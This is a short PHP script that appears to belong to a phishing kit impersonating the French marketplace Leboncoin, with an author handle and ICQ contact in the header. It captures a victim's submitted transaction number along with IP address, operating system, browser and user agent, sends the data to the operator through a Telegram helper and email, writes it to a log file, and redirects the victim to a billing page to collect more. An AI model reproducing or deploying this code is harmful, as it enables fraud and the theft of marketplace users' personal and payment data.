<?php
session_start();
/*

Author : H3L13M
ICQ : @651198700

*/

if(isset($_POST['nta']) ){
include "../config.php";
include "inc/funcs.php";




$subject = "[Leboncoin] [NTA] INFO from $ip";

$_SESSION['nta'] = $_POST['nta'];
$mail = $_POST['nta'];
	
$message = "Numero de transaction de l'acheteur : $mail\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../billing.php\" />";
}
else{
	
	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../index.php\" />";
}
?>